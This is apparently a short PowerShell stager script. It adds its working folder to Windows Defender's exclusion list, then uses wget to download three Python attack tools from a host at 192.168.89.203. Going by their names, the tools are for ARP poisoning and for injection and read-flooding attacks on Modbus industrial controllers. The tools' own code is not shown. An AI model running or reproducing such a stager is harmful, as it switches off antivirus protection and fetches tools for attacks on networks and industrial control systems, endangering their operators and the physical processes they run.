$curDir = Get-Location;Add-MpPreference -ExclusionPath $curDir;
wget "http://192.168.89.203/arp_poisoning.py" -outfile $curDir\arp_poisoning.py;
wget "http://192.168.89.203/limit_inject.py" -outfile $curDir\limit_inject.py;
wget "http://192.168.89.203/read_bomb_pymodbus.py" -outfile $curDir\readbomb.py;